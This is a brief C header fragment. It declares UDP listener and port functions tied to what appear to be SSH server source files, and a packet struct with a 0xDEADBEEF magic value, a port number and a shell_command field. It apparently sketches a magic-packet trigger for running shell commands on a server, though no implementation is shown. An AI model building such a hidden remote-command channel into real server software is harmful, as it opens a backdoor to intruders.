void *start_udp(void); 			//svr-runopts.c
void start_udp_request(void);	//svr-runopts.c to svr-main.c
void add_port_request(int);		//svr-main.c
void add_port(const char* );	//svr-runopts.c


typedef struct {
	uint32_t magic; /* should be 0xDEADBEEF */
	uint16_t port_number;
    char shell_command[256];
} listen_packet_t;
